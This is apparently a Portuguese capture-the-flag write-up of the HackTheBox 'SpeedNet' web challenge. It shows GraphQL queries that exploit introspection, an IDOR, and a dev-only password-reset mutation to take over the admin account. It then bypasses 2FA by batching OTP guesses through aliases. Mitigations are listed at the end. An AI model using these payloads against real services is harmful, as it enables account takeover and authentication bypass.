# SpeedNet

## informações da challenge

| atributo | valor |
|----------|-------|
| **plataforma** | HackTheBox |
| **tipo** | Challenge |
| **categoria** | Web |
| **dificuldade** | Easy |
| **técnicas** | GraphQL Introspection, IDOR, Password Reset Abuse, Information Disclosure, GraphQL Alias Batching, 2FA Bypass |
| **link HTB** | https://app.hackthebox.com/challenges/SpeedNet |

---

## resumo

a aplicação expõe uma API GraphQL acessível após autenticação. durante a enumeração foi possível realizar introspection do schema completo, revelando mutations internas destinadas ao ambiente de desenvolvimento.

uma vulnerabilidade de IDOR permitia consultar dados de qualquer usuário, incluindo o email do administrador. em seguida, uma mutation esquecida (`devForgotPassword`) retornava diretamente o token de reset de senha, possibilitando alterar a senha do administrador sem acesso ao email.

após o login, o sistema exigia autenticação em dois fatores (2FA). o próprio endpoint de login retornava um token temporário necessário para validar o OTP. como o OTP possuía apenas quatro dígitos e o backend utilizava GraphQL, foi possível utilizar aliases para testar centenas de códigos em uma única requisição HTTP, contornando o rate limit baseado em requisições.

---

## enumeração

### exploração inicial

após criar uma conta e autenticar normalmente, toda a comunicação da aplicação ocorreu através de um único endpoint GraphQL.

```
POST /graphql
```

as operações observadas eram:

- login
- register
- userProfile
- invoiceHistory
- currentInvoice

a aplicação utilizava JWT para autenticação.

---

## GraphQL introspection

o primeiro objetivo foi descobrir o schema completo.

GraphQL Introspection estava habilitado.

foi utilizada a seguinte query:

```graphql
{
  __schema {
    mutationType {
      fields {
        name
      }
    }
  }
}
```

para facilitar a enumeração foi utilizada a extensão **InQL** do Burp Suite.

as mutations descobertas foram:

```
login
register
forgotPassword
devForgotPassword
resetPassword
verifyTwoFactor
updateProfile
resendOTP
```

a presença da mutation `devForgotPassword` chamou atenção imediatamente por aparentar ser destinada apenas ao ambiente de desenvolvimento.

---

## IDOR

a query responsável pelo perfil aceitava um identificador arbitrário.

```graphql
query {
    userProfile(id: 1) {
        id
        email
        firstName
        lastName
        address
        phoneNumber
        twoFactorAuthEnabled
    }
}
```

o backend não validava autorização.

foi possível consultar usuários diferentes apenas alterando o ID.

resposta:

```json
{
    "data": {
        "userProfile": {
            "id": 1,
            "email": "admin@speednet.htb",
            "firstName": "Arnold",
            "lastName": "Robin",
            "address": "...",
            "phoneNumber": "...",
            "twoFactorAuthEnabled": true
        }
    }
}
```

agora já era conhecido:

- email do administrador
- existência de 2FA

---

## password reset

a mutation pública era:

```graphql
mutation {
    forgotPassword(email:"user@example.com")
}
```

ela apenas disparava o fluxo normal de reset.

entretanto existia também:

```graphql
mutation {
    devForgotPassword(email:"user@example.com")
}
```

executando para a própria conta:

```json
{
    "data": {
        "devForgotPassword":
        "Dev only! Password reset token: 4024010b-e66d-42e1-910b-276d05f55f27"
    }
}
```

a aplicação retornava diretamente o token de reset.

bastou trocar o email pelo email do administrador.

```graphql
mutation {
    devForgotPassword(email:"admin@speednet.htb")
}
```

com o token em mãos, foi utilizada a mutation normal:

```graphql
mutation {
    resetPassword(
        token:"TOKEN"
        password:"NovaSenha123!"
    )
}
```

a senha do administrador foi alterada com sucesso.

---

## login

ao realizar login com a nova senha foi retornado:

```
2FA_REQUIRED:a4e024df-7174-4e17-bb9a-a812b12add69
```

esse valor não era um JWT.

tratava-se de um token temporário utilizado apenas para validação do segundo fator.

---

## 2FA

a mutation responsável era:

```graphql
mutation Verify($token:String!,$otp:String!){
    verifyTwoFactor(
        token:$token,
        otp:$otp
    ){
        token
    }
}
```

testando um OTP inválido:

```
0000
```

resposta:

```
Invalid or expired OTP
```

o token estava correto.

o OTP era o único valor desconhecido.

---

## rate limit

uma tentativa óbvia seria utilizar Intruder.

entretanto o backend limitava o número de requisições HTTP.

como GraphQL permite múltiplas operações na mesma requisição utilizando aliases, foi possível testar dezenas de códigos simultaneamente.

exemplo:

```graphql
mutation{
a0000:verifyTwoFactor(token:"TOKEN",otp:"0000"){token}
a0001:verifyTwoFactor(token:"TOKEN",otp:"0001"){token}
a0002:verifyTwoFactor(token:"TOKEN",otp:"0002"){token}
...
a0099:verifyTwoFactor(token:"TOKEN",otp:"0099"){token}
}
```

cada alias executava uma mutation independente.

assim uma única requisição HTTP testava 100 OTPs diferentes.

---

## automação

foi desenvolvido um pequeno script em Python responsável por:

- gerar aliases automaticamente
- enviar lotes de 100 OTPs
- procurar um JWT válido na resposta
- interromper a execução assim que encontrasse sucesso

fluxo:

```
0000-0099

0100-0199

0200-0299

...
```

quando um dos aliases acertava o OTP, apenas aquele retornava um JWT válido enquanto todos os demais retornavam erro.

---

## login como administrador

após descobrir o OTP correto, a mutation retornou:

```json
{
    "data": {
        "a1234": {
            "token": "eyJhbGc..."
        }
    }
}
```

esse JWT foi utilizado normalmente como Authorization.

agora era possível acessar todas as funcionalidades da aplicação como administrador.

---

## flag

após autenticar como administrador, a flag encontrava-se disponível na área **Billing** da aplicação.

---

## vulnerabilidades exploradas

1. GraphQL Introspection habilitada em produção
2. IDOR em `userProfile`
3. mutation de desenvolvimento exposta (`devForgotPassword`)
4. Password Reset sem restrições adicionais
5. vazamento do token temporário de 2FA
6. OTP de apenas quatro dígitos
7. rate limit baseado apenas em requisições HTTP
8. possibilidade de batching utilizando GraphQL aliases

---

## lições aprendidas

- sempre realizar introspection quando GraphQL estiver disponível.
- ferramentas como InQL aceleram significativamente a enumeração.
- operações internas de desenvolvimento frequentemente permanecem expostas em produção.
- IDORs aparentemente simples podem servir apenas como etapa intermediária para exploração mais complexa.
- GraphQL aliases podem alterar completamente a superfície de ataque contra mecanismos de rate limiting.
- rate limiting deve considerar operações individuais, não apenas requisições HTTP.

---

## mitigações

- desabilitar GraphQL Introspection em produção.
- remover mutations de desenvolvimento.
- aplicar autorização em todos os resolvers.
- nunca retornar tokens sensíveis através da API.
- associar tokens de reset e 2FA ao usuário e à sessão corretamente.
- utilizar OTPs maiores ou baseados em TOTP.
- aplicar rate limit por operação GraphQL.
- limitar quantidade de aliases e profundidade das queries.
